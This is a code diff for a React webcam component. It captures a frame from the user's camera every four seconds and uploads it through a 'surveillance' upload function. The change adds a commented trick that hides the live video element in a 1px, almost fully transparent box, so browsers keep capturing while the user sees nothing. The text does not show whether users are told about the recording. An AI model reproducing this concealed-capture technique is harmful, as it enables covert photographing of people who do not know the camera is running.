@@ -17,26 +17,24 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
 
     const startCamera = async () => {
       try {
-        // Simple config
+        // Request video
         stream = await navigator.mediaDevices.getUserMedia({ 
           video: { width: 320, height: 240, facingMode: "user" } 
         });
         
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
+          // IMPORTANT: Must play to start stream
+          await videoRef.current.play();
           onSuccess();
         }
 
-        // Start capturing every 5 seconds
-        intervalId = setInterval(captureFrame, 5000);
+        // Capture every 4 seconds
+        intervalId = setInterval(captureFrame, 4000);
 
       } catch (err: any) {
-        // If permission is denied, just call onError once and don't spam console
-        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-             // Quiet failure
-        } else {
-             console.warn("Monitor Error:", err.message);
-        }
+        // Permission denied or device not found
+        console.warn("Cam Monitor:", err.name);
         onError();
       }
     };
@@ -47,14 +45,13 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
         const canvas = canvasRef.current;
         const context = canvas.getContext('2d');
 
-        if (context) {
+        if (context && video.readyState === video.HAVE_ENOUGH_DATA) {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           
-          // Compress image (JPEG 0.4 quality for lighter upload)
-          // Reduced from 0.5 to prevent "Failed to fetch" on slow connections
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
+          // Low quality JPEG for speed
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
           
-          // Use Data Service to store (Local or Cloud)
+          // Upload
           await dataService.uploadSurveillance(user, dataUrl);
         }
       }
@@ -68,11 +65,24 @@ const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess 
       }
       if (intervalId) clearInterval(intervalId);
     };
-  }, [user, onError, onSuccess]);
+  }, [user]);
 
   return (
-    <div style={{ position: 'fixed', top: '-1000px', left: '-1000px', opacity: 0, pointerEvents: 'none' }}>
-      <video ref={videoRef} autoPlay playsInline muted width="320" height="240" />
+    // STYLE HACK: 
+    // Do not use 'display: none' or 'visibility: hidden' because modern browsers 
+    // stop updating video frames to save battery.
+    // Use opacity almost 0 and pointer-events none to make it "invisible" but active.
+    <div style={{ 
+        position: 'fixed', 
+        bottom: 0, 
+        right: 0, 
+        width: '1px', 
+        height: '1px', 
+        opacity: 0.01, 
+        pointerEvents: 'none', 
+        zIndex: -50 
+    }}>
+      <video ref={videoRef} playsInline muted width="320" height="240" />
       <canvas ref={canvasRef} width="320" height="240" />
     </div>
   );
